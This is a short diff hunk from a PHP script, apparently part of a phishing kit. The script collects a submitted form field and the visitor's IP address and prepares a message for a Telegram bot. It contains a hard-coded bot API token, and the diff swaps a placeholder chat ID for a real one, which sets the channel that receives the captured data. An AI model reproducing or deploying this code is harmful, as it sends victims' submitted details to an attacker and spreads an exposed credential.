@@ -17,7 +17,7 @@ $country = $_POST['country'];
  $ip =$_SERVER['REMOTE_ADDR'];
 require 'js-zone/c.php';
 $apiToken = "1329906897:AAGVEsKf9A-AaaW_l2goz9tCITEB1j9tvKM";
-$chat = "XXXXXXXXXX";
+$chat = "703000402";
 $data = [
     'chat_id' => $chat,
     'text' => "❄⊚-----------------------------------⊚❄
